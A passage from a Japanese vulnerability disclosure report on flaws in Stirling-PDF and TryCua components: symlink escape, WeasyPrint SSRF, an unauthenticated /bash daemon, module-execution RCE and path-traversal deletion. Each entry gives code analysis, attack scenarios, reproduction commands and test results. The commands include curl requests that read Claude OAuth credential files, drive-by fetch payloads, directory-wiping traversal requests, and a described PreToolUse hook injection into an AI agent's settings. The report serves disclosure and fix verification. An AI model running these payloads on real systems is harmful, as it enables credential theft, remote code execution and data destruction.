Phishing After Slash Command Confirm):** Confirming a slash command on the trusted GitLab domain redirects (`302 Found`) the developer to an external credential-harvesting page.<br/>**Scenario B (Cross-Project ChatOps Account Binding):** A `command_id` minted in Project B is accepted on Project A's `/slash_commands/confirm` endpoint.<br/>**Scenario C (ChatOps Callback Hijack):** `request_params[:response_url]` overrides the cached `response_url` during `VerifyRequest#approve!`. | `RED`: `http_status: 302, open_redirect_triggered: true, cross_project_cache_collision_accepted: true`<br/>`GREEN`: `404, open_redirect_triggered: false`<br/>`pytest -k test_report5_cand04` |
| **19** | [`19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md`](advisories/ja/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md)<br/>Upstream Duplicate: `CVE-2026-40295`<br/>*(GitHub Only — Not Submitted to MITRE)* | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`lib/gitlab/devise_failure.rb:4-18`<br/>`lib/gitlab/auth/session_expire_from_init_enforcer.rb:44-62`<br/>`app/controllers/oauth/authorizations_controller.rb:316-330` | `CWE-601 / CWE-345`<br/>**5.4 Medium (Upstream CVE-2026-40295 Duplicate)**<br/>`AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` | **[UPSTREAM DUPLICATE: `CVE-2026-40295` — Published on GitHub Only, Not Submitted to MITRE]**<br/>**How It Happens in Code:** `Gitlab::DeviseFailure` inherits `Devise 5.0.3` `redirect_url` (`CVE-2026-40295`), which redirects to an unsanitized external `Referer` on non-GET `:timeout` failures; `AuthorizationsController#validate_pkce_for_dynamic_applications` (`CAND-03`) has an early return on `nil` `code_challenge_method` (mitigated at runtime by `Doorkeeper 5.9.3`).<br/>**Scenario A/B/C:** Product-level `extract_path_from_location(request.referrer)` override in `lib/gitlab/devise_failure.rb` and controller-level PKCE defense-in-depth patch. | `DUPLICATE OF CVE-2026-40295` *(Not submitted to MITRE)*<br/>`RED`: `external_referer_redirect: true`<br/>`GREEN`: `path_extracted_only: true` |

---

### III.01 — Stirling-PDF (`v3.2.2`) — 監視フォルダ（`Watched Folder`）のシンボリックリンク（`Symlink`）脱出による `FolderAccessGuard` バイパス（`GHSA-hpc7-xx5r-gc44`、`CWE-59`/`CWE-61`、CVSS `7.1 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `Stirling-Tools/Stirling-PDF`（`Maven: stirling.software:stirling-pdf`）
* **影響を受けるバージョン & コンポーネント:** `<= v3.2.2`（`commit 684608d143779bf3a8ffc67639f077a1202c62ff`）— `FolderInputSource.java`（`listFiles`、`337-377` 行）、`ProcessingFolderController.java`（`374-380` 行）、`FolderOutputSink.java`（`archiveOriginal`、`338-345` 行）
* **脆弱性分類 & スコア:** `CWE-59`（ファイルアクセス前の不適切なリンク解決）/ `CWE-61`（UNIX シンボリックリンクの追跡）— **CVSS v3.1: `7.1 High`**（`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`）
* **GitHub GHSA リンク:** `GHSA-hpc7-xx5r-gc44`（`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-hpc7-xx5r-gc44`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/01-STIRLING-CAND-02-SYMLINK.md`](advisories/ja/01-STIRLING-CAND-02-SYMLINK.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Stirling-PDF の **自動処理監視フォルダ（Watched Folder）** 機能は、社内ネットワークの共有フォルダ（例: `/mnt/scanner-incoming`）に置かれた文書を自動的に読み取って処理し、出力フォルダ（`/mnt/scanner-processed`）へ保存するために使われます。開発者は、この機能がサーバー自身の機密設定ファイル（`/configs/settings.yml` など）を読み取らないよう、`FolderAccessGuard.isProtected(path)` というセキュリティガードを実装しました。

ところが、Java 標準のファイル判定メソッド `Files.isRegularFile(path)` には重大な落とし穴があります。**第2引数に `LinkOption.NOFOLLOW_LINKS` を指定しない限り、シンボリックリンク（ショートカット）を自動的に追跡し、リンク先が通常ファイルであれば `true` を返してしまう** のです。一方で `FolderAccessGuard.isProtected(path)` は実体パス（`toRealPath()`）ではなく見かけ上の字句パス（`path.toAbsolutePath().normalize()`）しかチェックしません。

`FolderInputSource.java:337-350` にある実際の脆弱なコードは以下の通りです。
```java
private static List<Path> listFiles(
        Path inputDir, boolean recursive, FolderAccessGuard accessGuard) throws IOException {
    List<Path> files = new ArrayList<>();
    if (!recursive) { // デフォルトモード: recursive = false
        try (Stream<Path> entries = Files.list(inputDir)) {
            entries.filter(Files::isRegularFile) // バグ 1: LinkOption.NOFOLLOW_LINKS がないためシンボリックリンクを追跡する！
                    .filter(file -> !hidden(file)) // バグ 2: accessGuard.isProtected(file) すらここで呼ばれていない！
                    .forEach(files::add);
        }
        return files;
    }
```
さらに `ProcessingFolderController.java:374` が後続で `accessGuard.isProtected(path)` を呼んでも、見かけ上の名前は `/mnt/scanner-incoming/invoice.pdf` であるためガードを素通りします。そして最後に `FolderOutputSink.java:342` の `Files.move(originalFile, archiveTarget)` または `Files.copy` がリンク先の実体ファイルを読み取り・移動させてしまいます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — オフィス複合機・スキャナー共有フォルダ（SMB/NFS）経由での管理者・OAuth 秘密情報の窃取:**
  1. 企業内で Stirling-PDF が `/mnt/office-scanner/incoming` フォルダを監視し、処理済み文書を `/mnt/office-scanner/processed` に出力している。
  2. 共有フォルダへの書き込み権限を持つ一般社員または侵害された端末が、`ln -s /configs/settings.yml /mnt/office-scanner/incoming/invoice_2026.pdf` というシンボリックリンクを作成する。
  3. Stirling-PDF のポーリング処理がこのリンクを通常ファイルと誤認して処理・アーカイブし、`/configs/settings.yml` 内の初期管理者パスワード、OAuth2 クライアントシークレット、SMTP 認証情報、API キーが共有出力フォルダへそのままコピーされ、全社員から閲覧可能になる。
* **シナリオ B — SFTP / Nextcloud 自動取込パイプラインにおける `archiveOriginal()` での設定破壊とサービス停止（DoS）:**
  1. 外部取引先が請求書をアップロードする SFTP ディレクトリが Stirling-PDF の監視フォルダに接続されており、処理後に元ファイルをアーカイブする設定になっている。
  2. アップロードされたアーカイブまたは SFTP セッション経由で、アプリケーションのデータファイルや `.env` / 設定ファイルへのシンボリックリンクが配置される。
  3. `FolderOutputSink.archiveOriginal()` が元ファイルを移動（`Files.move`）または上書きし、Stirling-PDF サーバーの設定やデータベースが破損して業務が停止する。
* **シナリオ C — マルチテナント部門別フォルダ間での機密人事・財務文書の横断窃取:**
  1. 同一サーバー上で複数部門（人事部 `/watched/hr`、営業部 `/watched/sales`）の監視フォルダが運用されている。
  2. 営業部フォルダへのアクセス権を持つ攻撃者が、`ln -s /watched/hr/payroll_2026.pdf /watched/sales/scan01.pdf` を配置する。
  3. `staysWithinCanonicalRoot` による正規化ルート境界チェックがないため、営業部の出力フォルダに人事部の給与明細 PDF が複製される。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. Sniper SAST エンジンによる Stirling-PDF 監視フォルダの監査
python3 scripts/sniper-project-audit /path/to/Stirling-PDF --format json --output stirling-audit.json

# 2. ローカル隔離テスト環境での RED -> GREEN ランタイム証明の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_stirling_cand02 -v

# 3. ランタイム証明 JSON 出力の確認
python3 -c 'import json; d=json.load(open("docs/advisories/other-repos-and-cua-real-world-impact-e2e-20261029.json")); print(json.dumps(d["results"]["STIRLING-CAND-02"], indent=2))'
```
**実測ランタイム証明（`RED -> GREEN`）:**
```json
{
  "RED": {
    "recursive": false,
    "symlink_accepted": true,
    "protected_settings_exfiltrated": true,
    "exfiltrated_secret_snippet": "admin_api_key: sk-live-stirling-9988776655"
  },
  "GREEN": {
    "recursive": false,
    "symlink_accepted": false,
    "protected_settings_exfiltrated": false,
    "regular_file_processed": true
  }
}
```

---

### III.02 — Stirling-PDF (`v3.2.2`) — `ConvertWebsiteToPDF.java` における `CVE-2026-71270` の修正漏れと WeasyPrint サブリソース SSRF（`GHSA-ff6j-8xch-j8r6`、`CWE-918`、CVSS `8.6 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `Stirling-Tools/Stirling-PDF`（`Maven: stirling.software:stirling-pdf`）
* **影響を受けるバージョン & コンポーネント:** `<= v3.2.2`（`commit 684608d143779bf3a8ffc67639f077a1202c62ff`）— `ConvertWebsiteToPDF.java`（`urlToPdf`、`116-143` 行 — `POST /api/v1/convert/url/pdf`）
* **脆弱性分類 & スコア:** `CWE-918`（サーバーサイド・リクエスト・フォージェリ / SSRF）— **CVSS v3.1: `8.6 High`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`）
* **GitHub GHSA リンク:** `GHSA-ff6j-8xch-j8r6`（`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-ff6j-8xch-j8r6` — `CVE-2026-71270` / `GHSA-j5rg-wh78-9f2q` の修正漏れ）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/ja/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Stirling-PDF には以前に **WeasyPrint が HTML 内の外部リンク（`<link>`、`<img>`、`@import`）を自動的に取得してしまうことで内部ネットワークの情報を盗み出せる SSRF 脆弱性（`CVE-2026-71270` / `GHSA-j5rg-wh78-9f2q`）** が報告されました。開発チームは HTML ファイルアップロード用の `FileToPdf.java` にサニタイザと `--allowed-protocols data`（外部 HTTP 通信の禁止）を追加して修正しました。

しかし、隣のファイルである URL から PDF への変換エンドポイント `ConvertWebsiteToPDF.java`（`POST /api/v1/convert/url/pdf`）には同じ修正が適用されませんでした。
```java
// app/core/src/main/java/stirling/software/SPDF/controller/api/converters/ConvertWebsiteToPDF.java:116-143
String htmlContent = fetchRemoteHtml(URL); // トップレベル URL のみ SsrfProtectionService で検査される
// バグ 1: customHtmlSanitizer.sanitize(htmlContent) が呼ばれていない！
Files.writeString(tempHtmlInput, htmlContent, StandardCharsets.UTF_8);

List<String> command = new ArrayList<>();
command.add(runtimePathConfig.getWeasyPrintPath());
command.add(tempHtmlInput.toString());
command.add("--base-url");
command.add(URL);
command.add("--pdf-forms");
command.add("--allowed-protocols");
command.add("data,http,https"); // バグ 2: WeasyPrint サブプロセスに任意の http/https 通信を許可している！
```
この結果、攻撃者が用意した公開 Web ページ（`https://example-attacker.com/page.html`）自体は最初のチェックを通過しますが、その HTML の中に `<link rel="stylesheet" href="http://127.0.0.1:8080/internal-secrets.css">` や `<img src="http://169.254.169.254/...">` を書いておくと、**Java の SSRF 防御を一切通らないネイティブの WeasyPrint プロセスが直接内部サーバーへアクセスし、その結果を生成された PDF の中に書き込んで攻撃者へ返してしまう** のです。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — クラウド環境（AWS/GCP/Azure）で稼働する PDF 変換サービスからの IAM 認証情報・メタデータ窃取:**
  1. 社内ポータルや SaaS バックエンドが「Web ページを PDF 保存」機能として Stirling-PDF の `/api/v1/convert/url/pdf` を提供している。
  2. 攻撃者が自前の公開 URL を入力する。そのページの HTML には CSS `content` プロパティや `<object>` / `<link>` でクラウドメタデータ API またはローカル設定エンドポイントへの参照が含まれている。
  3. WeasyPrint が `--allowed-protocols data,http,https` で内部エンドポイントを取得し、返却された PDF ファイルのページ内に内部シークレットが印字されてダウンロードされる。
* **シナリオ B — Kubernetes / Docker 内部ネットワーク上の未認証マイクロサービス（`127.0.0.1` / `10.x.x.x`）の探索とデータ抽出:**
  1. Stirling-PDF コンテナと同一 Pod または同一内部サブネット上で、Spring Boot Actuator（`http://127.0.0.1:8080/actuator/env`）や Prometheus（`http://10.0.0.12:9090/metrics`）が稼働している。
  2. Java の `SsrfProtectionService` は直接 `http://127.0.0.1` を入力すると拒否するが、外部 URL 内の `@import url("http://127.0.0.1:8080/...")` は WeasyPrint が直接取得するため、内部 API レスポンスが PDF 経由で流出する。
* **シナリオ C — HTTP `302` リダイレクトを利用した内部管理画面のレンダリングとファイアウォール回避:**
  1. 攻撃者の公開サーバー上の画像/スタイルシート URL が、初回アクセス時に HTTP `302 Found` で社内イントラネットの管理画面（`http://intranet-admin.local/`）へリダイレクトする。
  2. WeasyPrint の HTTP クライアントがリダイレクトを追跡し、社内管理画面の内容を PDF 化して攻撃者に返す。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. ConvertWebsiteToPDF.java 内の --allowed-protocols 設定をソースコードで確認
grep -n -C 12 "allowed-protocols" /path/to/Stirling-PDF/app/core/src/main/java/stirling/software/SPDF/controller/api/converters/ConvertWebsiteToPDF.java

# 2. ローカルループバック（127.0.0.1）を用いた隔離 E2E 検証テストの実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_stirling_cand01 -v
```
**実測ランタイム証明（`RED -> GREEN`）:**
```json
{
  "RED": {
    "weasyprint_allowed_protocols": "data,http,https",
    "internal_subresource_fetched": true,
    "internal_data_embedded_in_pdf": true,
    "internal_loopback_hit_count": 1
  },
  "GREEN": {
    "weasyprint_allowed_protocols": "data",
    "internal_subresource_fetched": false,
    "internal_data_embedded_in_pdf": false,
    "internal_loopback_hit_count": 0
  }
}
```

---

### III.03 — TryCua `cuabot` (`<= 1.0.16`) — 未認証 `0.0.0.0:7842` デーモン + `POST /bash` のワイルドカード CORS + オリジン未検証 WebSocket + 書き込み可能なホスト `.claude` マウント（`GHSA-cp36-x5hg-3gg8`、`CWE-306`/`CWE-942`、CVSS `9.6 Critical`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `trycua/cua`（`npm: cuabot <= 1.0.16`）
* **影響を受けるバージョン & コンポーネント:** `>= 1.0.1, <= 1.0.16`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cuabot/src/cuabotd.ts`（`34-36, 259-260, 741-743, 969-1002, 1018-1063, 1120` 行）
* **脆弱性分類 & スコア:** `CWE-306`（重要機能における認証の欠如）/ `CWE-942`（過度なクロスドメイン許可リスト）— **CVSS v3.1: `9.6 Critical`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`）
* **GitHub GHSA リンク:** `GHSA-cp36-x5hg-3gg8`（`https://github.com/trycua/cua/security/advisories/GHSA-cp36-x5hg-3gg8`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/ja/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
`cuabot` は開発者のマシン上で動作する AI エージェント補助ツールです。そのバックグラウンドデーモンである `cuabotd.ts` には、4つの致命的な設計ミスが同時に重なっています。
1. **全ネットワークインターフェースでの未認証公開:** `server.listen(port, ...)`（`1120` 行）にホスト指定がないため、デフォルトの `0.0.0.0:7842` で待受け、パスワードやトークン認証が一切ありません。
2. **すべての Web サイトに API 呼び出しと応答読み取りを許可するワイルドカード CORS:**
   ```typescript
   // libs/cuabot/src/cuabotd.ts:967-974
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   if (req.method === 'OPTIONS') {
     res.writeHead(200);
     res.end();
     return;
   }
   ```
3. **`POST /bash` とオリジン未検証の WebSocket PTY による任意コマンド実行:** `/bash` エンドポイントは送られた JSON の `command` をそのままシェル実行して標準出力を返し、`WebSocketServer`（`741` 行）は `Origin` ヘッダーを確認せずに対話型ターミナルを起動します。
4. **ホストの `.claude` 認証ディレクトリの読み書きマウント:** コンテナ起動時にホスト側の `~/.cuabot/user/.claude` を `/home/community-user/.claude` として読み書き可能でバインドマウントしています（`259-260` 行）。

これにより、開発者が `cuabot` を起動したままブラウザで任意の Web ページ（広告やブログ記事など）を開いた瞬間、そのページ内の JavaScript が `fetch("http://localhost:7842/bash", ...)` を叩いて任意のコマンドを実行し、Claude Code の OAuth トークンを盗み出したり設定を書き換えたりできます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — ブラウザで一般の Web ページを開いた瞬間に発生するドライブバイ RCE と Claude OAuth 認証情報の窃取:**
  1. 開発者がローカルで `npx cuabot` を起動して作業しながら、ブラウザで技術ブログやドキュメントサイトを閲覧する。
  2. ページ内のスクリプトが `fetch("http://localhost:7842/bash", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({command: "cat /home/community-user/.claude/.credentials.json"})})` を送信する。
  3. `Access-Control-Allow-Origin: *` のためブラウザはプリフライト（`OPTIONS`）を通過させ、レスポンス本文（Claude OAuth アクセストークン・リフレッシュトークン）を攻撃者のスクリプトへそのまま渡す。
* **シナリオ B — 書き込み可能な `/home/community-user/.claude/settings.json` への永続的 `PreToolUse` フック注入によるホスト OS 侵害:**
  1. ドライブバイ要求またはクロスサイト WebSocket ハイジャック（`new WebSocket("ws://localhost:7842/?command=bash")`）によって、マウントされた `/home/community-user/.claude/settings.json` が書き換えられる。
  2. 攻撃者が Claude Code の `hooks.PreToolUse` に悪意あるシェルコマンドを登録する。
  3. 以降、開発者がホスト OS 上で Claude Code を使うたびに、ホスト OS 権限でバックドアコマンドが自動実行される。
* **シナリオ C — カフェ・コワーキングスペース・社内 Wi-Fi（`0.0.0.0:7842`）からの直接侵入と画面盗撮:**
  1. 開発者がカフェやオフィス LAN に接続している間、`cuabotd` は `0.0.0.0:7842` で待機している。
  2. 同一 Wi-Fi 上の攻撃者が `curl http://<開発者IP>:7842/screenshot` で開発者の作業画面をリアルタイムに盗撮し、`POST /bash` でワークステーションを完全に制御する。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. ローカル隔離ハーネスにおけるクロスオリジン（Origin: https://evil.example）再現コマンド例
curl -i -X POST http://127.0.0.1:7842/bash \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"command":"id && cat /home/community-user/.claude/.credentials.json"}'

# 2. Sniper 自動検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand01 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "http_status": 200,
    "access_control_allow_origin": "*",
    "driveby_bash_executed": true,
    "mounted_host_claude_credentials_exfiltrated": true
  },
  "GREEN": {
    "http_status": 403,
    "driveby_bash_executed": false,
    "mounted_host_claude_credentials_exfiltrated": false,
    "error": "Cross-origin browser requests forbidden"
  },
  "BENIGN": {
    "http_status": 200,
    "stdout": "authorized_cli_ok"
  }
}
```

---

### III.04 — TryCua `cua-bench-rl` (`<= 0.1.0`) — `0.0.0.0:8001` ワーカーサーバーのワイルドカード CORS + フェイルオープン `OSGYM_ALLOWED_IPS` + 未認証 `POST /reset` による任意モジュール実行（`GHSA-xm8w-gj3g-4f25`、`CWE-94`/`CWE-942`、CVSS `8.8 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `trycua/cua`（`pip: cua-bench-rl <= 0.1.0` および `cua-bench <= 0.3.1`）
* **影響を受けるバージョン & コンポーネント:** `<= 0.1.0`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py`（`79-108, 338-360, 499` 行）および `libs/cua-bench/cua_bench/core.py`（`make`、`25-51` 行）
* **脆弱性分類 & スコア:** `CWE-94`（コード生成の不適切な制御）/ `CWE-942`（過度なクロスドメイン許可リスト）— **CVSS v3.1: `8.8 High`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`）
* **GitHub GHSA リンク:** `GHSA-xm8w-gj3g-4f25`（`https://github.com/trycua/cua/security/advisories/GHSA-xm8w-gj3g-4f25`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/ja/04-CUA-CAND-02-WORKER-SERVER-RCE.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
強化学習（RL）ワーカーサーバー `worker_server.py` は、クライアントから送られた環境パス（`env_path`）を読み込んでタスクを初期化する `POST /reset` API を提供しています。開発者はアクセス制限のために `ip_filter_middleware` を書きましたが、以下の3つのバグが重なっています。
```python
# libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py:79-105
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], # バグ 1: 任意の外部 Web サイトからのブラウザ Fetch を許可！
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.middleware("http")
async def ip_filter_middleware(request: Request, call_next):
    allowed_ips = os.environ.get("OSGYM_ALLOWED_IPS", "127.0.0.1").split(",")
    allowed_ips = [ip.strip() for ip in allowed_ips if ip.strip()]
    client_ip = request.client.host if request.client else None
    # バグ 2: ブラウザから http://127.0.0.1:8001 へ送られたリクエストは client_ip == "127.0.0.1" になる！
    # バグ 3: OSGYM_ALLOWED_IPS="" (空文字) の場合、allowed_ips が [] となり `if allowed_ips:` が False に評価され全 IP を素通りさせる！
    if allowed_ips and client_ip not in allowed_ips:
        return JSONResponse(status_code=403, content={"detail": f"Access denied for IP: {client_ip}"})
    return await call_next(request)
```
そして `POST /reset` が呼ばれると、`cua_bench/core.py:38-51` の `make(req.env_path)` が渡されたディレクトリ内の `main.py` を探して **そのまま Python プロセス内で動的ロード・実行（`spec.loader.exec_module(module)`）** します。つまり、`env_path` に任意のフォルダを指定するだけで、その中の `main.py` が無条件で実行されます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — ローカルで RL ワーカーを起動中の研究者が Web ページを開いた際のドライブバイ RCE:**
  1. AI 研究者がワークステーション上で `worker_server.py` を起動したままブラウザで論文サイトやフォーラムを開く。
  2. ブラウザが自動的にファイルを `~/Downloads` へ保存した上で、ページ内の JS が `fetch("http://127.0.0.1:8001/reset", {method: "POST", body: JSON.stringify({env_path: "/tmp/untrusted_env", task_index: 0})})` を呼び出す。
  3. リクエスト元 IP は `127.0.0.1` であるため `ip_filter_middleware` を通過し、`spec.loader.exec_module` によってホスト上で任意の Python コードが実行され、GPU サーバーの SSH 鍵や HuggingFace / WandB トークンが窃取される。
* **シナリオ B — Docker Compose / Kubernetes 環境で `OSGYM_ALLOWED_IPS=""` が空設定されたことによる全ネットワーク RCE:**
  1. デプロイテンプレートや Helm チャートで `OSGYM_ALLOWED_IPS: ""` が未設定（空文字）のまま渡される。
  2. Python の `if allowed_ips:` が `False` となって IP フィルタが完全に無効化（フェイルオープン）され、クラスタ内や LAN 上の任意のホストから `http://<worker-ip>:8001/reset` でリモートコード実行が可能になる。
* **シナリオ C — 未認証の `/screenshot` と `/step` によるデスクトップ画面監視と操作注入:**
  1. 攻撃者がクロスオリジンリクエストまたは LAN 経由で `GET /screenshot` をポーリングしてデスクトップ画面を監視し、`POST /step` でキーボード・マウスイベントを注入して画面上の別アプリケーションを操作する。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. ローカル隔離環境でのクロスオリジン POST /reset 再現コマンド例
curl -i -X POST http://127.0.0.1:8001/reset \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"env_path":"/tmp/poc_env","task_index":0}'

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand02 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "cross_origin_reset_status": 200,
    "empty_allowed_ips_remote_lan_status": 200,
    "arbitrary_env_path_exec_module_rce": true
  },
  "GREEN": {
    "cross_origin_reset_status": 403,
    "empty_allowed_ips_remote_lan_status": 403,
    "outside_env_path_status": 400,
    "arbitrary_env_path_exec_module_rce": false
  },
  "BENIGN": {
    "loopback_valid_task_reset_status": 200
  }
}
```

---

### III.05 — TryCua `cua-compat` (`<= 0.8.0`) — Daytona S3 マルチパート `uploadId` パストラバーサルと無条件の `tokio::fs::remove_dir_all` によるディレクトリ削除（`GHSA-3x8g-6h2v-8qx9`、`CWE-22`、CVSS `8.1 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `trycua/cua`（`Cargo: cua-compat <= 0.8.0` / `cua-spacesd <= 0.8.0`）
* **影響を受けるバージョン & コンポーネント:** `<= 0.8.0`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cua/crates/cua-compat/src/daytona/objectstore.rs`（`handle`、`320-325, 360-422` 行）
* **脆弱性分類 & スコア:** `CWE-22`（パストラバーサル）— **CVSS v3.1: `8.1 High`**（`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`）
* **GitHub GHSA リンク:** `GHSA-3x8g-6h2v-8qx9`（`https://github.com/trycua/cua/security/advisories/GHSA-3x8g-6h2v-8qx9`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/ja/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Daytona 互換の S3 オブジェクトストア実装（`objectstore.rs`）では、URL パスに含まれるオブジェクトキー（`key`）に対しては `object_path(&key)` 関数で `..` が含まれないよう丁寧にチェックしています。ところが、URL クエリ文字列から取り出される **`?uploadId=` パラメータには一切のバリデーションがありません**。

さらに深刻なことに、マルチパートアップロードを中断する `HTTP DELETE` ハンドラ（`415-421` 行）は次のようになっています。
```rust
// libs/cua/crates/cua-compat/src/daytona/objectstore.rs:415-421
(Method::DELETE, Some(id), _, _) => {
    d.objects.uploads.lock().await.remove(&id); // バグ 1: その uploadId が実在したかどうか（戻り値 Option）を無視している！
    // バグ 2: 未検証の `id` をそのままパス結合し、無条件で再帰削除 remove_dir_all を実行！
    let _ = tokio::fs::remove_dir_all(d.objects.root.join("uploads").join(&id)).await;
    Response::builder()
        .status(StatusCode::NO_CONTENT)
        .body(Full::new(Bytes::new()))
        .unwrap()
}
```
これにより、事前にアップロードを開始する必要すらなく、たった1回の `DELETE /daytona/anykey?uploadId=../objects` リクエストを送るだけで、`root.join("uploads").join("../objects")` すなわち **オブジェクトストア全体の保存ディレクトリ（`<root>/objects`）が再帰的に完全削除** されます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — マルチテナント AI サンドボックス基盤における全テナントのイメージ・スナップショット一括消去:**
  1. 複数のチームや顧客テナントが共有する `cua-spacesd` サーバー上で、1つの低権限サンドボックステナントが `DELETE /daytona/x?uploadId=../objects` を送信する。
  2. `tokio::fs::remove_dir_all` が `<root>/objects/daytona` を即座に削除し、全テナントの保存済み VM/コンテナスナップショットが消失して全サービスが停止する。
* **シナリオ B — 深いパストラバーサル（`?uploadId=../../...`）によるホスト側アプリケーションデータ・DB の破壊:**
  1. 攻撃者が `?uploadId=../../state` や `?uploadId=../../../home/community-user/.cua` を指定して `DELETE` リクエストを送る。
  2. `d.objects.root` の親ディレクトリへ脱出し、`cua-spacesd` プロセス権限で書き込み可能なホスト側のデータベースや設定ディレクトリが再帰削除される。
* **シナリオ C — `PUT` マルチパートチャンク書き込み（`?partNumber=1&uploadId=../stage`）による隣接ディレクトリの汚染:**
  1. `Method::PUT` ハンドラ（`360-383` 行）でも同様に `root.join("uploads").join(&id)` が使われているため、攻撃者が `?partNumber=1&uploadId=../stage` を指定して任意のバイナリチャンクをアップロードする。
  2. 本来の `uploads/` ではなく隣接する `stage/` や `objects/` 配下に不正なファイルが作成・上書きされる。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. ローカル隔離テスト環境での DELETE ?uploadId=../objects 再現コマンド例
curl -i -X DELETE "http://127.0.0.1:9000/daytona/dummy-key?uploadId=../objects" \
  -H "Authorization: Bearer <push-token>"

# 2. Sniper E2E 検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand03 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "delete_traversal_status": 204,
    "objects_store_wiped_without_prior_upload": true
  },
  "GREEN": {
    "delete_traversal_status": 400,
    "delete_uninitiated_id_status": 404,
    "objects_store_preserved": true
  },
  "BENIGN": {
    "valid_upload_abort_status": 204,
    "staging_dir_removed": true
  }
}
```

---

### III.06 — TryCua `cua-media-codec` (`<= 0.8.0`) — Safe Rust `VtEncoder::encode` におけるスライス長未検証の `unsafe { copy_nonoverlapping }` によるヒープ境界外読み取り（`GHSA-54v9-fxw3-36mm`、`CWE-125`/`CWE-190`、CVSS `5.5 Medium`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `trycua/cua`（`Cargo: cua-media-codec <= 0.8.0`）
